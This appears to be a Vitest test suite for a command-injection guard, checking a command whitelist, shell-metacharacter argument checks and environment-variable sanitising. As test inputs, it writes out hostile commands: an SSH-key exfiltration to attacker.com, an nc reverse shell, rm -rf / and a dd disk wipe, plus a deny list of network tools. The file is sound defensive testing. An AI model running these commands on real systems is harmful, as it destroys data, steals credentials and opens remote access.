/**
 * Security Tests: Command Injection Prevention
 *
 * Tests REQ-SEC-001 implementation.
 * Covers 25+ attack vectors for command injection.
 */

import { describe, it, expect } from 'vitest';
import {
  parseCommand,
  validateArguments,
  sanitizeEnv,
  isSafeCommand,
  getSafeCommands,
} from '../../src/utils/command-security.js';

describe('REQ-SEC-001: Command Injection Prevention', () => {
  describe('Command Whitelist', () => {
    it('should allow whitelisted commands', () => {
      expect(isSafeCommand('ls')).toBe(true);
      expect(isSafeCommand('grep')).toBe(true);
      expect(isSafeCommand('cat')).toBe(true);
      expect(isSafeCommand('git')).toBe(true);
      expect(isSafeCommand('rm')).toBe(true);
      expect(isSafeCommand('mkdir')).toBe(true);
      expect(isSafeCommand('touch')).toBe(true);
      expect(isSafeCommand('cp')).toBe(true);
      expect(isSafeCommand('mv')).toBe(true);
    });

    it('should block non-whitelisted commands', () => {
      expect(isSafeCommand('dd')).toBe(false);
      expect(isSafeCommand('curl')).toBe(false);
      expect(isSafeCommand('wget')).toBe(false);
      expect(isSafeCommand('bash')).toBe(false);
      expect(isSafeCommand('sh')).toBe(false);
      expect(isSafeCommand('python')).toBe(false);
      expect(isSafeCommand('node')).toBe(false);
    });

    it('should block dangerous commands', () => {
      const dangerousCommands = [
        'dd',       // Disk operations
        'mkfs',     // Filesystem creation
        'shutdown', // System control
        'reboot',   // System control
        'curl',     // Network access
        'wget',     // Network access
        'nc',       // Network access
        'netcat',   // Network access
        'python',   // Code execution
        'node',     // Code execution
        'ruby',     // Code execution
        'perl',     // Code execution
      ];

      for (const cmd of dangerousCommands) {
        expect(isSafeCommand(cmd)).toBe(false);
      }
    });
  });

  describe('parseCommand', () => {
    it('should parse valid whitelisted commands correctly', () => {
      const parsed = parseCommand('ls -la /tmp');
      expect(parsed.command).toBe('ls');
      expect(parsed.args).toEqual(['-la', '/tmp']);
    });

    it('should reject empty commands', () => {
      expect(() => parseCommand('')).toThrow('Empty command string');
    });

    it('should reject whitespace-only commands', () => {
      expect(() => parseCommand('   ')).toThrow('Empty command string');
    });

    it('should reject non-whitelisted commands', () => {
      expect(() => parseCommand('dd if=/dev/zero of=/dev/sda')).toThrow('not in whitelist');
      expect(() => parseCommand('curl evil.com')).toThrow('not in whitelist');
      expect(() => parseCommand('wget malicious.com')).toThrow('not in whitelist');
      expect(() => parseCommand('bash -c "evil"')).toThrow('not in whitelist');
    });
  });

  describe('validateArguments', () => {
    it('should allow safe arguments', () => {
      const result = validateArguments(['file.txt', '-la', '/home/user']);
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should block semicolon command chaining', () => {
      const result = validateArguments(['file.txt; rm -rf /']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block pipe command chaining', () => {
      const result = validateArguments(['file.txt | cat']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block AND command chaining', () => {
      const result = validateArguments(['file.txt && curl evil.com']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block OR command chaining', () => {
      const result = validateArguments(['file.txt || wget evil.com']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block backtick command substitution', () => {
      const result = validateArguments(['`curl evil.com`']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block $() command substitution', () => {
      const result = validateArguments(['$(rm -rf /)']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block output redirection (>)', () => {
      const result = validateArguments(['>', '/etc/passwd']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block input redirection (<)', () => {
      const result = validateArguments(['<', '/etc/shadow']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block append redirection (>>)', () => {
      const result = validateArguments(['>>', '/etc/hosts']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block background execution (&)', () => {
      const result = validateArguments(['sleep', '100', '&']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block null byte injection', () => {
      const result = validateArguments(['test\0file.txt']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('null byte');
    });

    it('should block curly brace expansion', () => {
      const result = validateArguments(['{1..100}']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block square bracket wildcards', () => {
      const result = validateArguments(['[a-z]*']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block wildcard injection', () => {
      const result = validateArguments(['*.txt']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block tilde expansion', () => {
      const result = validateArguments(['~root']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block excessively long arguments', () => {
      const longArg = 'a'.repeat(10001);
      const result = validateArguments([longArg]);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('maximum length');
    });

    it('should block single quotes', () => {
      const result = validateArguments(["test'file"]);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block double quotes', () => {
      const result = validateArguments(['test"file']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });

    it('should block backslash escape', () => {
      const result = validateArguments(['test\\file']);
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('shell metacharacters');
    });
  });

  describe('sanitizeEnv', () => {
    it('should only pass safe environment variables', () => {
      const unsafeEnv = {
        PATH: '/usr/bin',
        HOME: '/home/user',
        API_KEY: 'secret123',
        AWS_SECRET: 'aws_secret',
        DATABASE_PASSWORD: 'db_pass',
        MALICIOUS_VAR: 'rm -rf /',
      };

      const sanitized = sanitizeEnv(unsafeEnv);

      // Should include safe vars
      expect(sanitized.PATH).toBe('/usr/bin');
      expect(sanitized.HOME).toBe('/home/user');

      // Should exclude unsafe vars
      expect(sanitized.API_KEY).toBeUndefined();
      expect(sanitized.AWS_SECRET).toBeUndefined();
      expect(sanitized.DATABASE_PASSWORD).toBeUndefined();
      expect(sanitized.MALICIOUS_VAR).toBeUndefined();
    });

    it('should handle missing safe variables gracefully', () => {
      const emptyEnv = {};
      const sanitized = sanitizeEnv(emptyEnv);

      expect(Object.keys(sanitized).length).toBe(0);
    });
  });

  describe('getSafeCommands', () => {
    it('should return all whitelisted commands', () => {
      const commands = getSafeCommands();
      expect(commands.length).toBeGreaterThan(10);
      expect(commands).toContain('ls');
      expect(commands).toContain('grep');
      expect(commands).toContain('git');
    });
  });

  describe('Real Attack Scenarios', () => {
    it('should prevent classic command injection via filename', () => {
      // Note: 'cat' is whitelisted, but the semicolon in arguments will be caught
      const parsed = parseCommand('cat file.txt');
      const validation = validateArguments(['file.txt; curl http://evil.com/steal']);
      expect(validation.valid).toBe(false);
      expect(validation.errors[0]).toContain('shell metacharacters');
    });

    it('should prevent command injection via backticks', () => {
      const validation = validateArguments(['`whoami`']);
      expect(validation.valid).toBe(false);
    });

    it('should prevent command injection via $() substitution', () => {
      const validation = validateArguments(['$(curl evil.com)']);
      expect(validation.valid).toBe(false);
    });

    it('should prevent directory traversal combined with command injection', () => {
      const validation = validateArguments(['../../../etc/passwd; curl evil.com']);
      expect(validation.valid).toBe(false);
    });

    it('should prevent data exfiltration attempts', () => {
      expect(() => {
        parseCommand('curl attacker.com?data=$(cat ~/.ssh/id_rsa)');
      }).toThrow('not in whitelist');
    });

    it('should prevent privilege escalation', () => {
      expect(() => {
        parseCommand('sudo bash');
      }).toThrow('not in whitelist');
    });

    it('should prevent remote shell execution', () => {
      expect(() => {
        parseCommand('nc -e /bin/bash attacker.com 1234');
      }).toThrow('not in whitelist');
    });
  });
});
